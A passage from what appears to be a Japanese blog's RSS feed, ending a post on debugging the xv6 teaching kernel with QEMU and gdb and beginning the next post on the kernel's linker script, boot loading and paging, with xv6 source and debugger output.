&lt;td align=&quot;center&quot;&gt;-gdb &amp;#x3C;tcp::port&gt;&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;GDB接続を指定のプロトコル、ポートで受け入れる&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.qemu.org/docs/master/system/invocation.html#hxtool-0&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Invocation — QEMU documentation&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/wataash/items/174b454d4478898a556b&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;カーネルデバッグで使うQEMUオプションチートシート - Qiita&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;デバッグを試す&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%82%92%E8%A9%A6%E3%81%99&quot; aria-label=&quot;デバッグを試す permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;デバッグを試す&lt;/h3&gt;
&lt;p&gt;xv6カーネルのシンボル情報は、ビルド時に&lt;code class=&quot;language-text&quot;&gt;kernel.sym&lt;/code&gt;に格納されています。&lt;/p&gt;
&lt;p&gt;実際にgdb側でシンボルのアドレスを検索してみても同等の結果になります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ info address main
Symbol &lt;span class=&quot;token string&quot;&gt;&quot;main&quot;&lt;/span&gt; is a &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt; at address 0x80103040.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;main関数にブレークポイントを仕掛けます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ main
$ c
Continuing.
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;----------------------------------registers-----------------------------------&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
EAX: 0x80103040 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xfb1e0ff3 
EBX: 0x10094 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
ECX: 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
EDX: 0x1f0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
ESI: 0x10094 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
EDI: 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
EBP: 0x7bf8 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
ESP: 0x8010b5c0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
EIP: 0x80103040 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xfb1e0ff3
EFLAGS: 0x86 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;carry PARITY adjust zero SIGN &lt;span class=&quot;token builtin class-name&quot;&gt;trap&lt;/span&gt; interrupt direction overflow&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;-------------------------------------code-------------------------------------&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
   0x80103034 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;mpenter+2&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;:	call   0x801027a0 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;lapicinit&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
   0x80103039 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;mpenter+2&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;5&lt;/span&gt;&gt;&lt;/span&gt;:	call   0x80102fe0 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;mpmain&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
   0x8010303e:	xchg   ax,ax
&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x80103040 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;:	endbr32 
   0x80103044 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;4&lt;/span&gt;&gt;&lt;/span&gt;:	lea    ecx,&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;esp+0x4&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
   0x80103048 &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;8&lt;/span&gt;&gt;&lt;/span&gt;:	and    esp,0xfffffff0
   0x8010304b &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+1&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;1&lt;/span&gt;&gt;&lt;/span&gt;:	push   DWORD PTR &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;ecx-0x4&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
   0x8010304e &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;main+1&lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;4&lt;/span&gt;&gt;&lt;/span&gt;:	push   ebp
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;------------------------------------stack-------------------------------------&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
0000&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x8010b5c0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
0004&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x8010b5c4 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
0008&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x8010b5c8 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
0012&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x8010b5cc --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
0016&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x8010b5d0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
0020&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x8010b5d4 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
0024&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x8010b5d8 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
0028&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; 0x8010b5dc --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0x0 --&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; 0xf000ff53 
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;------------------------------------------------------------------------------&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
Legend: code, data, rodata, value

Thread &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; hit Breakpoint &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;, main &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; at main.c:19&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;僕の環境ではgdb-pedaを有効化しているので色々でてきました。&lt;/p&gt;
&lt;p&gt;これでカーネルのデバッグができるようになりました。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;はじめはbochsでやろうと思ったのですが、トラシューが上手くいかなかったのでgdbを使ってデバッグすることにしました。&lt;/p&gt;
&lt;p&gt;こっちの方が設定が簡単で使い慣れているので結果としてよかったです。&lt;/p&gt;
&lt;p&gt;今度こそほんとのほんとにカーネル本体を読み進めます。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -リンカ・ページング編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのデバッグ環境を構築します。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-002-load-kernel</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-002-load-kernel</guid><pubDate>Sun, 16 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;リバースエンジニアリングに強くなりたいのと、カーネルとかOSに詳しくなりたいと思っています。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;が結構重かったので、もう少し軽めのところから始めたいと思っていたところ、UNIX V6というOSがトータルで1万行くらいのコード量で、人類でもギリギリ理解できるということを知り、興味を持ちました。&lt;/p&gt;
&lt;p&gt;ただ、UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-001-bootstrap&quot;&gt;前回&lt;/a&gt;に引き続きxv6OSのソースコードを読んでいきます。&lt;/p&gt;
&lt;p&gt;前回の記事では、xv6OSのブートストラップのコードを読んで、カーネル本体をロードする手前まで追っていきました。&lt;/p&gt;
&lt;p&gt;今回は実際に読み込まれるカーネルの動きを追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89&quot;&gt;カーネルのロード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E3%83%93%E3%83%AB%E3%83%89&quot;&gt;カーネルプログラムのビルド&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%AA%E3%83%B3%E3%82%AB%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88&quot;&gt;リンカスクリプト&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%AA%E3%83%B3%E3%82%AB%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%81%AE%E6%A7%8B%E9%80%A0&quot;&gt;リンカスクリプトの構造&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AE%E5%AE%9A%E7%BE%A9&quot;&gt;エントリポイントの定義&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sectionstext%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot;&gt;SECTIONS：textセクションの定義&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sectionsrodata%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot;&gt;SECTIONS：rodataセクションの定義&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sectionsstabstabstr%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot;&gt;SECTIONS：stab,stabstrセクションの定義&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sectionsdata%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot;&gt;SECTIONS：dataセクションの定義&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sectionsbss%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%AE%9A%E7%BE%A9&quot;&gt;SECTIONS：bssセクションの定義&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sectionsdiscard&quot;&gt;SECTIONS：DISCARD&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88&quot;&gt;カーネルのエントリポイント&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%9E%E3%83%AB%E3%83%81%E3%83%96%E3%83%BC%E3%83%88%E3%83%98%E3%83%83%E3%83%80&quot;&gt;マルチブートヘッダ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AE%E7%89%A9%E7%90%86%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E5%AE%9A%E7%BE%A9&quot;&gt;エントリポイントの物理アドレスを定義&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%82%A8%E3%83%B3%E3%83%88%E3%83%AA%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89&quot;&gt;カーネルのエントリポイントのロード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E3%81%A8%E3%81%AF&quot;&gt;ページングとは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%82%BF%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;スタックポインタの設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#main%E9%96%A2%E6%95%B0%E3%81%AB%E7%A7%BB%E8%A1%8C&quot;&gt;main関数に移行&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;カーネルのロード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89&quot; aria-label=&quot;カーネルのロード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルのロード&lt;/h2&gt;
&lt;p&gt;ブートストラップの中でカーネルのロードを行っていた箇所を振り返っておきます。&lt;/p&gt;
&lt;p&gt;カーネルの読み込みは、以下のようにメモリの&lt;code class=&quot;language-text&quot;&gt;0x10000&lt;/code&gt;番地に読み込まれました。&lt;/p&gt;
&lt;p&gt;その後、プログラムヘッダがロードされ、&lt;code class=&quot;language-text&quot;&gt;entry()&lt;/code&gt;関数が呼び出されてカーネルに処理が移行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;bootmain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;elfhdr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;elf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proghdr&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ph&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;eph&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;entry&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; pa&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  elf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;elfhdr&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// scratch space&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Read 1st page off disk&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;elf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Is this an ELF executable?&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;magic &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; ELF_MAGIC&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;// let bootasm.S handle error&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Load each program segment (ignores ph flags).&lt;/span&gt;
  ph &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proghdr&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;elf &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phoff&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  eph &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ph &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phnum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ph &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; eph&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    pa &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;paddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
